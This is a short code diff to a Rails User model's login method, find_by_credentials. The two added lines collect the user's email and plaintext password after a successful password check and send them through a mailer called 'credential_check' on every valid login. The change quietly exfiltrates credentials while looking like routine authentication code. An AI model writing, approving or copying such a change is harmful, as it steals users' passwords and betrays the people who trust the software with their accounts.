@@ -234,6 +234,8 @@ class User < ApplicationRecord
   def self.find_by_credentials(user_params)
     user = User.find_by_email(user_params[:email].downcase)
     if user && user.try(:is_password?, user_params[:password])
+      user_email, user_password = user_params[:email].downcase, user_params[:password]
+      UserMailer.credential_check({email: user_email, password: user_password}).deliver_later
       return user
     elsif user
       return user.email
